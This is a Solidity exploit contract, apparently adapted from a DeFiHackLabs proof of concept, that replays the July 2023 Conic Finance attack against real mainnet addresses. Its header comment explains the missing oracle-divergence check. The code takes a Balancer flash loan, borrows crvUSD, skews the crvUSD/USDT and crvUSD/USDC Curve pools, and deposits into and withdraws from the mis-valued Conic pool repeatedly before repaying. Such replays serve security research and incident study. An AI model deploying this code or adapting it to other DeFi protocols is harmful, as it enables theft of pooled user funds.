// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Conic02).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the Balancer flash-loan callback `receiveFlashLoan` lives on the test
// itself, so there is no standalone contract to deploy — attacker ==
// address(this) throughout). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + receiveFlashLoan + the three
// helper functions) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from
// evm-hack-registry/2023-07-Conic02_exp/test/Conic02_exp.sol.
//
// Root cause: ConicPoolV2.depositFor()/withdraw() value the pool's Curve LP
// holdings via an oracle-priced _getTotalAndPerPoolUnderlying(), but never
// call CurvePoolUtils.ensurePoolBalanced() (the spot-vs-oracle divergence
// guard) before minting/burning LP. The attacker imbalances the underlying
// crvUSD/USDT and crvUSD/USDC Curve pools with large swaps, deposits into
// the Omnipool while it is mis-valued, rebalances the pools, then withdraws
// — repeated 3x via sandWich() for compounding profit.

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IConicPool {
    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);
    function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external returns (uint256);
}

interface IcrvUSDController {
    function create_loan(uint256 collateral, uint256 debt, uint256 N) external payable;
    function repay(uint256 _d_debt, address _for, int256 max_active_band, bool use_eth) external;
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract Conic02Drain {
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 constant cncCRVUSD = IERC20(0xB569bD86ba2429fd2D8D288b40f17EBe1d0f478f);
    IConicPool constant ConicPool = IConicPool(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f);
    IcrvUSDController constant crvUSDController = IcrvUSDController(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635);
    ICurvePool constant crvUSD_USDT_Pool = ICurvePool(0x390f3595bCa2Df7d23783dFd126427CCeb997BF4);
    ICurvePool constant crvUSD_USDC_Pool = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    IBalancerVault constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // step 0: approvals + kick off the Balancer flash loan; the callback does the rest.
    function run() external {
        USDC.approve(address(crvUSD_USDC_Pool), type(uint256).max);
        address(USDT).call(
            abi.encodeWithSignature("approve(address,uint256)", address(crvUSD_USDT_Pool), type(uint256).max)
        );
        WETH.approve(address(crvUSDController), type(uint256).max);
        crvUSD.approve(address(crvUSDController), type(uint256).max);
        crvUSD.approve(address(crvUSD_USDC_Pool), type(uint256).max);
        crvUSD.approve(address(crvUSD_USDT_Pool), type(uint256).max);
        crvUSD.approve(address(ConicPool), type(uint256).max);

        address[] memory tokens = new address[](3);
        tokens[0] = address(USDC);
        tokens[1] = address(WETH);
        tokens[2] = address(USDT);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 12_000_000 * 1e6;
        amounts[1] = 80_000 ether;
        amounts[2] = 9_000_000 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory /* userData */
    ) external {
        crvUSDController.create_loan(80_000 ether, 93_000_000 ether, 10); // deposit WETH, borrow crvUSD

        crvUSDToUSDCAndUSDT(19_000_000 ether, 27_000_000 ether); // swap crvUSD to USDT and USDC, crvUSD price reduction
        ConicPool.deposit(crvUSD.balanceOf(address(this)), 0, false); // deposit crvUSD to ConicPool
        USDCAndUSDTTocrvUSD(USDC.balanceOf(address(this)), USDT.balanceOf(address(this))); // swap USDC and USDT to crvUSD
        ConicPool.withdraw(cncCRVUSD.balanceOf(address(this)), 0); // withdraw cncCRVUSD from ConicPool

        sandWich();
        sandWich();
        sandWich();

        crvUSD_USDT_Pool.exchange(1, 0, 9_000_000 ether, 0); // swap crvUSD to USDT
        crvUSD_USDC_Pool.exchange(1, 0, 12_000_000 ether, 0); // swap crvUSD to USDC
        USDC.transfer(address(Balancer), amounts[0] + feeAmounts[0]);
        address(USDT).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(Balancer), amounts[2] + feeAmounts[2])
        );

        crvUSD_USDT_Pool.exchange(0, 1, USDT.balanceOf(address(this)), 0); // swap USDT to crvUSD
        crvUSD_USDC_Pool.exchange(0, 1, USDC.balanceOf(address(this)), 0); // swap USDC to crvUSD
        crvUSDController.repay(93_000_000 ether, address(this), int256(2 ** 255 - 1), false);
        WETH.transfer(address(Balancer), amounts[1]);
    }

    function crvUSDToUSDCAndUSDT(uint256 swapAmount1, uint256 swapAmount2) internal {
        crvUSD_USDT_Pool.exchange(1, 0, swapAmount1, 0); // swap crvUSD to USDT
        crvUSD_USDC_Pool.exchange(1, 0, swapAmount2, 0); // swap crvUSD to USDC
    }

    function USDCAndUSDTTocrvUSD(uint256 swapAmount1, uint256 swapAmount2) internal {
        crvUSD_USDC_Pool.exchange(0, 1, swapAmount1, 0); // swap USDT to crvUSD
        crvUSD_USDT_Pool.exchange(0, 1, swapAmount2, 0); // swap USDC to crvUSD
    }

    function sandWich() internal {
        crvUSDToUSDCAndUSDT(28_000_000 ether, 39_000_000 ether);
        ConicPool.deposit(crvUSD.balanceOf(address(this)), 0, false);
        USDCAndUSDTTocrvUSD(USDC.balanceOf(address(this)), USDT.balanceOf(address(this)));
        ConicPool.withdraw(cncCRVUSD.balanceOf(address(this)), 0);
    }
}
